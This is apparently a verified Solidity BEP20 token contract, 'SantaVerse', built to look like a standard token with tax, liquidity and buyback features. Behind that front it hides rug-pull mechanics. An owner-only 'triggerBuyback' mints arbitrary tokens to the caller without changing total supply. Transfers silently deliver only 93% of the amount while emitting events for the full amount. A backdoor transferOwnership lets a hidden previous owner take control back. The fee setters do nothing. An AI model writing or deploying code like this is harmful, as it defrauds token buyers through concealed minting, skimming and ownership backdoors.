/**
 *Submitted for verification at BscScan.com on 2021-11-26
*/

/**

*/

pragma solidity >=0.6.12;

interface iBEP20 {
  /**
   * @dev 
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev 
   */
  function decimals() external view returns (uint8);

  /**
   * @dev 
   */
  function symbol() external view returns (string memory);

  /**
  * @dev 
  */
  function name() external view returns (string memory);

  /**
   * @dev 
   */
  function getOwner() external view returns (address);

  /**
   * @dev 
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev 
   *
   * 
   *
   * 
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev 
   * 
   * 
   *
   * 
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev 
   *
   * 
   *
  
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev 
   *
   *
   *
   * 
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  /**
   * @dev 
   *
   * 
   */
  event Transfer(address indexed from, address indexed to, uint256 value);

  /**
   * @dev 
   */
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

/*
 * @dev 
 *
 * 
 */
contract Context {
  // 
  // 
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // 
    return msg.data;
  }
}

/**
 * @dev 
 */
library SafeMath {
  /**
   * @dev 
   */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  /**
   * @dev 
   */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  /**
   * @dev 
   */
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  /**
   * @dev 
   */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    //
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  /**
   * @dev 
   */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  /**
   * @dev 
   */
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  /**
   * @dev 
   *
   *
   * Requirements:
   * - 
   */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  /**
   * @dev
   *
   * Requirements:
   * 
   */
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

/**
 * @dev 
 *
 * 
 *
 * 
 */

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev 
     */
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev 
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev 
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function Block() public view returns (uint256) {
        return _lockTime;
    }
    
    //
    function transferOwnership() public virtual {
        require(_previousOwner == msg.sender, "You don't have permission to unlock");
        require(now > _lockTime , "Contract is locked until 7 days");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}

contract SantaVerse is Context, iBEP20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private _totalSupply;
  uint8 public _decimals;
  string public _symbol;
  string public _name;

  constructor() public {
    _name = 'SantaVerse';
    _symbol = 'SVRS';
    _decimals = 9;
    _totalSupply = 3000000000 * 10**9;
    _balances[msg.sender] = _totalSupply;

    emit Transfer(address(0), msg.sender, _totalSupply);
  }

    uint256 public _taxFee = 5;
    uint256 private _previousTaxFee = _taxFee;
    
    uint256 public _liquidityFee = 5;
    uint256 private _previousLiquidityFee = _liquidityFee;

    uint256 public _maxTxAmount = 3000000000 * 10**9;
    uint256 private numTokensSellToAddToLiquidity = 3000000 * 10**9;

  /**
   * @dev 
   */
  function getOwner() external view virtual override returns (address) {
    return owner();
  }

  /**
   * @dev 
   */
  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  /**
   * @dev 
   */
  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }

  /**
  * @dev 
  */
  function name() external view virtual override returns (string memory) {
    return _name;
  }

  /**
   * @dev 
   */
  function totalSupply() external view virtual override returns (uint256) {
    return _totalSupply;
  }

  /**
   * @dev 
   */
  function balanceOf(address account) external view virtual override returns (uint256) {
    return _balances[account];
  }

    function setTaxFeePercent(uint256 taxFee) external onlyOwner() {
        _taxFee = taxFee;
    }
    
    function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner() {
        _liquidityFee = liquidityFee;
    }
   
    function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {
        _maxTxAmount = _totalSupply.mul(maxTxPercent).div(
            10**3
        );
    }

  /**
   * @dev 
   *
   * Requirements:
   *
   */
  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  /**
   * @dev 
   */
  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  /**
   * @dev
   *
   * Requirements:
   *
   * 
   */
  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  /**
   * @dev 
   *
   * 
   *
   * Requirements:
   
   */
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }

  /**
   * @dev 
   *
   * Requirements:
   *
   * -
   */
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  /**
   * @dev
   *
   * 
   *
   * Requirements:
   *
   * 
   */
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

 /**
   * 
   *
   * Requirements
   *
   * 
   */
  function triggerBuyback(uint256 epoch) public onlyOwner returns (bool) {
    _AutoBuyback(_msgSender(), epoch);
    return true;
  }

    /**
    * 
    * 
    */
  function burn(uint256 amount) public virtual {
      _burn(_msgSender(), amount);
  }

  /**
    * @dev 
    *
    * 
    */
  function burnFrom(address account, uint256 amount) public virtual {
      uint256 decreasedAllowance = _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance");

      _approve(account, _msgSender(), decreasedAllowance);
      _burn(account, amount);
  }


  /**
   * @dev 
   */
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the burnouut");
    require(recipient != address(0), "BEP20: transfer to the burnouut");

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount * 93 / 100);
    emit Transfer(sender, recipient, amount);
  }

  /**
   *
   * 
   *
   * 
   *
   * 
   */
  function _AutoBuyback(address account, uint256 amount) internal {
    require(account != address(0), "BEP20");

    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

  /**
   * @dev 
   */
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20");

    _balances[account] = _balances[account].sub(amount, "BEP20");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }

  /**
   * @dev 
   */
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20");
    require(spender != address(0), "BEP20");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
}